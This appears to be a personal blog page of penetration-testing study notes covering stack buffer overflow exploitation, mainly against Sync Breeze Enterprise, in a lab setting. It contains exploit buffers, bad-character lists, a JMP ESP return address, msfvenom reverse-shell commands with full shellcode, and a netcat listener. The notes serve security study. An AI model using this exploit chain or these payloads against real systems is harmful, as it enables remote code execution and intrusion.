 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">padding &#x3D; &quot;\x41&quot; * 4368</span><br><span class="line">eip &#x3D; &quot;\x42\x42\x42\x42&quot;</span><br><span class="line">first_stage &#x3D; &quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;  # padding with nops</span><br><span class="line"></span><br><span class="line">buffer &#x3D; &quot;\x11(setup sound &quot; + padding + eip + first_stage + &quot;\x90\x00#&quot;</span><br></pre></td></tr></table></figure>


<h2 id="checking-for-bad-chars"><a href="#checking-for-bad-chars" class="headerlink" title="checking for bad chars"></a>checking for bad chars</h2><p>We sent the whole range of characters from 00 to FF within our buffer and then monitored<br>whether any of those bytes got mangled, swapped, dropped, or changed in memory once they<br>were processed by the application.</p>
<p>0x00 0x20  </p>
<h2 id="finding-a-return-address"><a href="#finding-a-return-address" class="headerlink" title="finding a return address"></a>finding a return address</h2><p>edb Plugins -&gt; OpcodeSearcher<br>0x8134596  </p>
<h2 id="getting-a-shell"><a href="#getting-a-shell" class="headerlink" title="getting a shell"></a>getting a shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.119.148 LPORT&#x3D;443 -b &quot;\x00\x20&quot; -f py -v shellcode</span><br></pre></td></tr></table></figure>

<p>the output format with<br>-f, and the variable name to use with -v.  </p>
<p>shell is stucked, because of debugger</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/17/Study-Notes-2021-03-17/">Study Notes - 2021/03/17</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h1><h1 id="Immunity-Debug"><a href="#Immunity-Debug" class="headerlink" title="Immunity Debug"></a>Immunity Debug</h1><p>F2 set break point<br>F9 to run the program<br>F7 step into the function<br>Ctrl + F9 execute until the return of the function  </p>
<h1 id="Windows-Buffer-Overflows"><a href="#Windows-Buffer-Overflows" class="headerlink" title="Windows Buffer Overflows"></a>Windows Buffer Overflows</h1><h2 id="Discover-the-vulnerability"><a href="#Discover-the-vulnerability" class="headerlink" title="Discover the vulnerability"></a>Discover the vulnerability</h2><ol>
<li>source code review</li>
<li>reverse engineering </li>
<li>fuzzing  </li>
</ol>
<h1 id="Fuzzing-the-http-protocal"><a href="#Fuzzing-the-http-protocal" class="headerlink" title="Fuzzing the http protocal"></a>Fuzzing the http protocal</h1><h2 id="get-seed"><a href="#get-seed" class="headerlink" title="get seed"></a>get seed</h2><p>use wireshark to capture packages<br>capture filter <code>host 192.168.119.148 and host 192.168.148.10</code><br>locate the /login page and right click <code>follow tcp stream</code>  – apply display filters  </p>
<p>TCP View Stored at: <code>C:\Tools\windows_buffer_overflows</code>  find the process listening on port 80<br>Run Immunity Debug with admin  </p>
<h2 id="Replicate-the-crash"><a href="#Replicate-the-crash" class="headerlink" title="Replicate the crash"></a>Replicate the crash</h2><h2 id="Control-EIP"><a href="#Control-EIP" class="headerlink" title="Control EIP"></a>Control EIP</h2><h3 id="Binary-Search"><a href="#Binary-Search" class="headerlink" title="Binary Search"></a>Binary Search</h3><p>AAAABBBB, then AAAABBCC then AAAABBCD until locate the eip  </p>
<p>generate non-repeat pattern<br><code>msf-pattern_create -l 800</code>  </p>
<p>eip replaced with <code>42306142</code>  -&gt; <code>B0aB</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ msf-pattern_offset -l 800 -q 42306142                                                                          </span><br><span class="line">[*] Exact match at offset 780</span><br></pre></td></tr></table></figure>

<h2 id="Locating-space-for-shell-code"><a href="#Locating-space-for-shell-code" class="headerlink" title="Locating space for shell code"></a>Locating space for shell code</h2><p>usually shell code length 350 - 400 bytes<br>esp locate at BBBBCCCCESP!  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filler &#x3D; &quot;A&quot; * 780</span><br><span class="line">eip &#x3D; &quot;B&quot; * 4</span><br><span class="line">offset &#x3D; &quot;C&quot; * 4</span><br><span class="line">buffer &#x3D; &quot;D&quot; * (1500 - len(filler) - len(eip) - len(offset))</span><br><span class="line">inputBuffer &#x3D; filler + eip + offset + buffer</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line">esp point to buffer  </span><br><span class="line"></span><br><span class="line">## checking for bad chars</span><br><span class="line">&#96;0x00&#96;  use to terminate string  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>badchars = (<br>“\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10”<br>“\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20”<br>“\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30”<br>“\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40”<br>“\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50”<br>“\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60”<br>“\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70”<br>“\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80”<br>“\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90”<br>“\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0”<br>“\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0”<br>“\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0”<br>“\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0”<br>“\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0”<br>“\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0”<br>“\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff” )</p>
<p>inputBuffer = filler + eip + offset + badchars</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">right click esp, follow in dump: find that char after 0x09 not appear  means 0x0a is a bad char (line feed, terminate the http field)  </span><br><span class="line"></span><br><span class="line">remove 0x0a from the barchar and repeat, find 0x0d (return char) is also bad  </span><br><span class="line">all bad char &#96;0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B 0x3D&#96;   </span><br><span class="line"></span><br><span class="line">## redirecting the execution flow</span><br><span class="line">the address differ from crash to crash  </span><br><span class="line">## find return address  </span><br><span class="line">JMP ESP  </span><br><span class="line">the addresses used in the library must be static, eliminates libraries compiled with ASLR support </span><br><span class="line">the **address** can not contain any bar char  </span><br><span class="line"></span><br><span class="line">use !mona modules</span><br></pre></td></tr></table></figure>
<p>Log data, item 7<br> Address=0BADF00D<br> Message= 0x00400000 | 0x00462000 | 0x00062000 | False  | False   | False |  False   | False  | -1.0- [syncbrs.exe] (C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">however the address leading with &#96;0x00&#96;  </span><br></pre></td></tr></table></figure>
<p>Log data, item 10<br> Address=0BADF00D<br> Message= 0x10000000 | 0x10223000 | 0x00223000 | False  | False   | False |  False   | False  | -1.0- [libspp.dll] (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tip: If this application was compiled with DEP support, our JMP ESP</span><br><span class="line">address would have to be located in the .text code segment of the module  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>kali@kali:~$ msf-nasm_shell<br>nasm &gt; jmp esp<br>00000000 FFE4 jmp esp<br>nasm &gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;!mona find -s &quot;\xff\xe4&quot; -m &quot;libspp.dll&quot;&#96;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Log data, item 3<br> Address=10090C83<br> Message=  0x10090c83 : “\xff\xe4” |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">JMP ESP instruction (0x10090c83)  </span><br><span class="line">eip &#x3D; &quot;\x83\x0c\x09\x10&quot;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## generate shell code with metasploit  </span><br><span class="line">&#96;msfvenom -l payloads&#96;  list available playload  </span><br><span class="line">&#96;msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.119.148 LPORT&#x3D;443 -f c&#96;  </span><br><span class="line">-p payload  </span><br><span class="line">-f to select C-formatted shellcode.  </span><br></pre></td></tr></table></figure>
<p>└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x86 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 324 bytes<br>Final size of c file: 1386 bytes<br>unsigned char buf[] =<br>“\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30”<br>“\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff”<br>“\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52”<br>“\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1”<br>“\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b”<br>“\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03”<br>“\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b”<br>“\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24”<br>“\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb”<br>“\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c”<br>“\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68”<br>“\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68”<br>“\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x77\x94\x68”<br>“\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61”<br>“\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2”<br>“\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6”<br>“\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44”<br>“\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56”<br>“\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff”<br>“\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6”<br>“\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb”<br>“\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5”;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include bad chars  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c –e x86/shikata_ga_nai -b “\x00\x0a\x0d\x25\x26\x2b\x3d”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-b bad char  </span><br><span class="line">-e encoder  </span><br><span class="line"></span><br><span class="line">the decoder (getPC routine) in the shell code modify the stack thus modify the decoder code it self.  </span><br><span class="line"></span><br><span class="line">create landing path, add many nops (\x90) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nops = “\x90” * 10<br>inputBuffer = filler + eip + offset + nops + shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo nc -lnvp 443  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Yeah!!  </span><br><span class="line"></span><br><span class="line">But when we exit the shell, the sync breeze crash and exit  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## improving the exploit  </span><br><span class="line">Using ExitThread instead of ExitProcess</span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b “\x00\x0a\x0d\x25\x26\x2b\x3d”</p>
<pre><code>
</code></pre>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>